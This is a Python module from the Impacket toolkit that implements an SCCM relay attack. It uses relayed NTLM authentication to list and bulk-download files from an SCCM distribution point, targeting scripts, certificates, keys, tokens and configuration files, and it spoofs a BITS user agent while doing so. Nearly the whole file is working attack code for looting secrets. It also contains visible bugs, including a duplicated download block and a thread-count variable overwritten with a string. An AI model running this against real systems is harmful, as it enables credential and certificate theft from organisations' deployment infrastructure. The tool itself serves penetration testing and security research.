# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2022 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   SCCM relay attack
#   Credits go to @badsectorlabs for documenting HTTP distribution points having juicy loot
#
# Authors:
#    Alberto Rodriguez (@__ar0d__) 
import datetime
import random
from pyasn1.codec.der.decoder import decode
from impacket import LOG
import logging
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin, urlparse
from html.parser import HTMLParser
import os
import threading
import configparser

class FileNameExtractor(HTMLParser):
    def __init__(self):
        super().__init__()
        self.file_names = []

    def handle_starttag(self, tag, attrs):
        if tag == 'a':
            for attr in attrs:
                if attr[0] == 'href':
                    file_name = self.extract_file_name(attr[1])
                    if file_name:
                        self.file_names.append(file_name)

    def extract_file_name(self, href):
        # Split the URL by '/'
        parts = href.split('/')
        # Get the last part of the URL
        last_part = parts[-1]
        # Remove any leading or trailing spaces
        trimmed_part = last_part.strip()
        return trimmed_part

class SCCMAttack:
    dateFormat = "%Y-%m-%dT%H:%M:%SZ"
    now = datetime.datetime.utcnow()

    def _run(self):
        if self.config.sccm_dp_dump:
            LOG.info("Dumping SCCM Distribution Point Files")

            # Vars used by other functions
            final_dir = f"{self.client.host}_sccm_dump"
            allowed_extensions = [
                "ps1", "vbs", "txt", "cmd", "bat", "pfx", "pem", "cer", "certs", "expect", 
                "sql", "xml", "ps1xml", "config", "ini", "ksh", "sh", "rsh", "py", 
                "keystore", "reg", "yml", "yaml", "token", "script", "sqlite", "plist", 
                "au3", "cfg"
            ]
            headers = {
                "User-Agent": "Microsoft+BITS/7.8",
            }

            # Create the output directory
            try:
                os.makedirs(final_dir, exist_ok=True)
            except Exception as err:
                logging.error(f"Error creating base output directory: {err}")
                return

            LOG.info("Getting Datalib listing...")
            datalib_body, err = self.get_datalib_listing(final_dir, headers)
            if err:
                logging.error(f"Failed to get Datalib listing: {err}")
                return

            if not isinstance(datalib_body, str):
                try:
                    datalib_body = datalib_body.decode('utf-8')
                except AttributeError:
                    raise TypeError("datalib_body must be a string or bytes that can be decoded to a string")

            LOG.info("Extracting file names from Datalib listing...")

            file_names = self.extract_file_names(datalib_body)

            LOG.info("Getting file signatures...")
            self.get_signatures(final_dir, file_names, 5, False)
          
            file_paths = self.walk_dir(f"{final_dir}/signatures")

            if not file_paths:
                logging.fatal("No signature files found!")

            for file_path in file_paths:
                try:
                    file_names = self.get_file_names_from_signature_file(file_path)
                except Exception as e:
                    print(f"Error: {e}")
                    continue

                self.write_string_array_to_file(f"{final_dir}/process_files.txt", file_names[0])
                self.download_files(self.config.lootdir, file_path, file_names[0], allowed_extensions, "", 10)
        else:
            LOG.info("No action specified, exiting")

        LOG.info("SCCM DP Looting complete!")

    def get_datalib_listing(self, output, headers):
        scheme = "https" if self.client.port == 443 else "http"
        host = self.client.host
        full_url = f"{scheme}://{host}/SMS_DP_SMSPKG$/Datalib"

        logging.info(f"Getting Datalib listing from {full_url}...")

        try:
            self.client.request("GET", "/SMS_DP_SMSPKG$/Datalib", headers=headers)
            response = self.client.getresponse()
        except Exception as err:
            logging.error(f"Error sending GET request: {err}")
            return "", err

        try:
            body = response.read().decode('utf-8')
        except Exception as err:
            logging.error(f"Error reading response body: {err}")
            logging.error(f"Try to download the Datalib folder manually to make sure it's accessible.")
            return "", err

        output_file_name = f"{output}/Datalib.txt"

        try:
            with open(output_file_name, 'w') as file:
                file.write(body)
        except Exception as err:
            logging.error(f"Error writing to file: {err}")
            return "", err

        logging.info(f"Data saved to {output_file_name}")
        return body, None

    def extract_file_names(self, html_content):
        parser = FileNameExtractor()
        parser.feed(html_content)
        return parser.file_names

    def download_file_from_url(self, path, output_path):
        try:
            self.client.request("GET", path, headers={"User-Agent": "Miccrosoft++BITS/7.8"})
            response = self.client.getresponse()

            if response.status != 200:
                raise Exception(f"HTTP server returned error code {response.status}")

            with open(output_path, 'wb') as file:
                while True:
                    chunk = response.read(8192)
                    if not chunk:
                        break
                    file.write(chunk)
            logging.debug(f"Successfully downloaded {path} to {output_path}")
        except Exception as err:
            logging.error(f"Error downloading {path}: {err}")

    def randomize_strings(strings):
        random.shuffle(strings)

    def get_signatures(self, output_dir, filenames, num_threads, randomize):
        num_threads = "place-holder"
        signatures_dir = os.path.join(output_dir, "signatures")
        # Ensure the output directory exists
        try:
            os.makedirs(signatures_dir, exist_ok=True)
        except Exception as err:
            logging.error(f"Error creating base output directory: {err}")
            return

        if randomize:
            self.randomize_strings(filenames)

        def download_signature(filename):
            if filename.endswith(".INI"):
                return

            path = f"/SMS_DP_SMSSIG$/{filename}.tar"
            output_path = f"{signatures_dir}/{filename}.tar"

            try:
                self.download_file_from_url(path, output_path)
            except Exception as err:
                logging.debug(f"Error downloading signature {filename}.tar: {err}")

        for filename in filenames:
            download_signature(filename)

    def walk_dir(self, signatures_dir):
        file_list = []
        for root, dirs, files in os.walk(signatures_dir):
            for file in files:
                
                file_list.append(os.path.join(root, file))
        return file_list

    def get_file_names_from_signature_file(self, file_path):
        try:
            # Open the binary file
            with open(file_path, 'rb') as file:
                # Read the entire file into memory
                file_data = file.read()
        except Exception as e:
            return None, e

        # Define the byte signature to search for
        signature = bytes([0x18, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01])

        # Initialize a list to store the file strings where the signature is found
        strings = []

        # Search for the signature in the file data
        for i in range(len(file_data) - len(signature)):
            if file_data[i:i+len(signature)] == signature:
                # Calculate the start offset for the string (512 bytes before the signature)
                start_offset = i - 512
                if start_offset < 0:
                    start_offset = 0

                # Find the end of the string (up to the first null byte)
                end_offset = start_offset
                while end_offset < len(file_data) and file_data[end_offset] != 0x00:
                    end_offset += 1

                # Extract the string
                string_bytes = file_data[start_offset:end_offset]

                strings.append(string_bytes.decode('utf-8', errors='ignore'))
        return strings, None

    def write_string_array_to_file(self, file_path, string_array):
        try:
            # Open the file in append mode, create it if it doesn't exist
            with open(file_path, 'a', encoding='utf-8') as file:
                # Join the strings with a newline character and write to the file
                line = '\n'.join(string_array)
                file.write(line)
                file.write('\n')  # Ensure the last line ends with a newline
        except Exception as err:
            print(f"Error writing to file: {err}")

    def get_hash_from_ini(self, file_path):
        config = configparser.ConfigParser()
        try:
            config.read(file_path)
        except Exception as e:
            raise ValueError(f"Error reading INI file: {e}")

        if 'File' not in config:
            raise ValueError("Section 'File' not found in the INI file")

        if 'Hash' not in config['File']:
            raise ValueError("Key 'Hash' not found in section 'File'")

        return config['File']['Hash']

    def file_wanted(self, allow_extensions, download_no_ext, filename, output_dir):
        file_suffix = os.path.splitext(filename)[1][1:]  # Remove the leading dot (.)
        out_path_files = ""

        if file_suffix:
            if allow_extensions and "all" not in allow_extensions and file_suffix not in allow_extensions:
                print(f"Skipping {filename}: {file_suffix} not wanted")
                return False, ""
            out_path_files = os.path.join(output_dir, "files", file_suffix)
            # Ensure the output directory exists for files
            os.makedirs(out_path_files, exist_ok=True)
        else:
            if download_no_ext:
                print(f"File {filename} has no file extension, downloading it!")
                out_path_files = os.path.join(output_dir, "files", "UKN")
                # Ensure the output directory exists for files
                os.makedirs(out_path_files, exist_ok=True)
            else:
                print(f"File {filename} has no file extension, and files without extensions are not being kept, skipping")
                return False, ""

        return True, out_path_files

    def download_ini_and_file(self, out_path, out_path_files, filename, dir_name, semaphore):
        try:
            output_path = os.path.join(out_path, filename + ".INI")
            path_1 = f"/SMS_DP_SMSPKG$/Datalib/{dir_name}/{filename}.INI"

            self.download_file_from_url(path_1, output_path)

            hash_value = self.get_hash_from_ini(output_path)
            if "/" in filename:
                filename = os.path.basename(filename)
            output_path_file = os.path.join(out_path_files, hash_value[:4] + "_" + filename)
            path_2 = f"/SMS_DP_SMSPKG$/FileLib/{hash_value[:4]}/{hash_value}"

            self.download_file_from_url(path_2, output_path_file)

        finally:
            semaphore.release()

    def download_files(self, output_dir, file_path, file_names, allow_extensions, download_no_ext, num_threads):
        sccm_dump_dir = f"{self.client.host}_sccm_dump"
        filename_with_ext = os.path.basename(file_path)
        dir_name = os.path.splitext(filename_with_ext)[0]

        out_path = os.path.join(output_dir, f"{sccm_dump_dir}/inis", dir_name)
        os.makedirs(out_path, exist_ok=True)

        out_path_files_base = os.path.join(output_dir, f"{sccm_dump_dir}/files")
        os.makedirs(out_path_files_base, exist_ok=True)

        semaphore = threading.Semaphore(num_threads)

        def download_task(filename):
            nonlocal out_path, out_path_files_base, allow_extensions, download_no_ext, dir_name

            filename = filename.replace("\\", "/")
            if "/" in filename:
                dir = os.path.dirname(filename)
                os.makedirs(os.path.join(out_path, dir), exist_ok=True)

            file_suffix = os.path.splitext(filename)[1]
            if len(file_suffix) > 1:
                file_suffix = file_suffix[1:]
                if allow_extensions and file_suffix not in allow_extensions:
                    return
                out_path_files = os.path.join(output_dir, f"{sccm_dump_dir}/files", file_suffix)
                os.makedirs(out_path_files, exist_ok=True)
            else:
                if download_no_ext:
                    logging.info(f"File {filename} has no file extension, downloading it!")
                    out_path_files = os.path.join(output_dir, "files", "UKN")
                    os.makedirs(out_path_files, exist_ok=True)
                else:
                    logging.info(f"File {filename} has no file extension, and files without extensions are not being kept, skipping")
                    return

            semaphore.acquire()
            self.download_ini_and_file(out_path, out_path_files, filename, dir_name, semaphore)

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            executor.map(download_task, file_names)
        filename_with_ext = os.path.basename(file_path)
        dir_name = os.path.splitext(filename_with_ext)[0]

        out_path = os.path.join(output_dir, f"{sccm_dump_dir}/inis", dir_name)
        os.makedirs(out_path, exist_ok=True)

        out_path_files_base = os.path.join(output_dir, f"{sccm_dump_dir}/inis")
        os.makedirs(out_path_files_base, exist_ok=True)

        semaphore = threading.Semaphore(num_threads)

        def download_task(filename):
            nonlocal out_path, out_path_files_base, allow_extensions, download_no_ext, dir_name

            filename = filename.replace("\\", "/")
            if "/" in filename:
                dir = os.path.dirname(filename)
                os.makedirs(os.path.join(out_path, dir), exist_ok=True)

            file_suffix = os.path.splitext(filename)[1]
            if len(file_suffix) > 1:
                file_suffix = file_suffix[1:]
                if allow_extensions and file_suffix not in allow_extensions:
                    #logging.info(f"Skipping {filename}: {file_suffix} not wanted")
                    return
                out_path_files = os.path.join(output_dir, f"{sccm_dump_dir}/inis", file_suffix)
                os.makedirs(out_path_files, exist_ok=True)
            else:
                if download_no_ext:
                    logging.info(f"File {filename} has no file extension, downloading it!")
                    out_path_files = os.path.join(output_dir, f"{sccm_dump_dir}/inis", "UKN")
                    os.makedirs(out_path_files, exist_ok=True)
                else:
                    logging.info(f"File {filename} has no file extension, and files without extensions are not being kept, skipping")
                    return

            semaphore.acquire()
            self.download_ini_and_file(out_path, out_path_files, filename, dir_name, semaphore)

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            executor.map(download_task, file_names)